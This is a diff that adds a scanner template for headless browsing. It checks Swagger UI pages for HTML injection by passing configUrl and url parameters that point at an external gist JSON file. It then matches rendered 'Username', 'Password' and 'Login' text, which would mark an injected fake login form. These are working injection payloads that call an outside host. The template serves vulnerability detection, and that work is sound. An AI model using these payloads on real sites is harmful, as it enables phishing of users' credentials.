@@ -1,0 +1,47 @@
+id: swagger-html-injection
+
+info:
+  name: Swagger UI Html injextion
+  author: samark
+  severity: medium
+  tags: headless, swagger
+
+headless:
+  - steps:
+      # Step 1: Navigate to the path
+      - action: navigate
+        args:
+          url: "{{BaseURL}}{{path}}"
+
+      # Step 2: Wait for JS execution
+      - action: waitload
+
+      # Step 3: Extra buffer time for slow Swagger renders
+      - action: sleep
+        args:
+          duration: 3s
+
+    # Define the paths you want to test here
+    payloads:
+      path:
+        - "?configUrl=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json"
+        - "?url=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json"
+        - "/index.html?url=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json"
+        - "/index.html?configUrl=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Username"
+          - "Password"
+          - "Login"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "swagger-ui"
+          - "swagger"
+        condition: or
